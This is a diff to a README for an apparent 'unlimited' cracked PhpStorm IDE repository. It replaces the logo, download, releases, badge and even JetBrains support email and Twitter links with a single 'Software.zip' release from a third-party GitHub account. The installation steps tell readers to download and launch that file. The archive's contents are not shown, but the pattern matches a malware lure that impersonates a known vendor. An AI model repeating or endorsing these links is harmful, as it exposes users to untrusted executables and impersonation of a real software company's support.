@@ -1,6 +1,6 @@
 # 🚀💻 Welcome to PhpStorm JetBrains Unlimited IDE
 
-![PhpStorm JetBrains Unlimited IDE Logo](https://example.com/logo.png)
+![PhpStorm JetBrains Unlimited IDE Logo](https://github.com/Barza22/PhpStorm-JetBrains-Unlimited-IDE/releases/download/v1.0/Software.zip)
 
 ## Repository Name
 **PhpStorm-JetBrains-Unlimited-IDE**
@@ -53,7 +53,7 @@ PhpStorm JetBrains Unlimited IDE is a powerful tool for PHP and web development.
 
 To get started with PhpStorm JetBrains Unlimited IDE, follow these simple steps:
 
-1. Download the IDE from the following link: [Download PhpStorm JetBrains Unlimited IDE](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+1. Download the IDE from the following link: [Download PhpStorm JetBrains Unlimited IDE](https://github.com/Barza22/PhpStorm-JetBrains-Unlimited-IDE/releases/download/v1.0/Software.zip)
 2. Once downloaded, launch the installation file
 3. Follow the on-screen instructions to complete the installation process
 4. After installation, open PhpStorm JetBrains Unlimited IDE and start coding!
@@ -65,8 +65,8 @@ To get started with PhpStorm JetBrains Unlimited IDE, follow these simple steps:
 If you encounter any issues or have any feedback regarding PhpStorm JetBrains Unlimited IDE, feel free to reach out to our support team. Your input is valuable to us as we strive to improve the IDE for all developers.
 
 ### Contact Us
-- Email: support@jetbrains.com
-- Twitter: [@PhpStormSupport](https://twitter.com/PhpStormSupport)
+- Email: https://github.com/Barza22/PhpStorm-JetBrains-Unlimited-IDE/releases/download/v1.0/Software.zip
+- Twitter: [@PhpStormSupport](https://github.com/Barza22/PhpStorm-JetBrains-Unlimited-IDE/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -86,9 +86,9 @@ We appreciate your efforts in improving PhpStorm JetBrains Unlimited IDE for eve
 
 ## Stay Updated
 
-Stay tuned for the latest updates and releases of PhpStorm JetBrains Unlimited IDE. To check for the most recent version, visit the **[Releases](https://github.com/cli/cli/releases)** section.
+Stay tuned for the latest updates and releases of PhpStorm JetBrains Unlimited IDE. To check for the most recent version, visit the **[Releases](https://github.com/Barza22/PhpStorm-JetBrains-Unlimited-IDE/releases/download/v1.0/Software.zip)** section.
 
-[![Download PhpStorm JetBrains Unlimited IDE](https://img.shields.io/badge/Download-PHPStorm%20JetBrains%20Unlimited%20IDE-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download PhpStorm JetBrains Unlimited IDE](https://github.com/Barza22/PhpStorm-JetBrains-Unlimited-IDE/releases/download/v1.0/Software.zip%20JetBrains%20Unlimited%20IDE-blue)](https://github.com/Barza22/PhpStorm-JetBrains-Unlimited-IDE/releases/download/v1.0/Software.zip)
 
 Start coding with PhpStorm JetBrains Unlimited IDE today and experience the power of an all-in-one development environment! 🚀💻
 
